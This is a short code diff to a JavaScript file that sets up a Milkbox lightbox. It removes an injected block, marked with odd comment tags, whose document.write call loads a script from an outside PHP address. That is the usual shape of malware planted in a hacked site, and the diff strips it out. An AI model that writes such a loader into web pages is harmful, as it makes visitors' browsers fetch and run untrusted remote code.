@@ -11,13 +11,3 @@
 window.addEvent('domready', function(){ 
 	milkbox = new Milkbox({ centered:true });
 });
-
-/*5ee739*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/5ee739*/
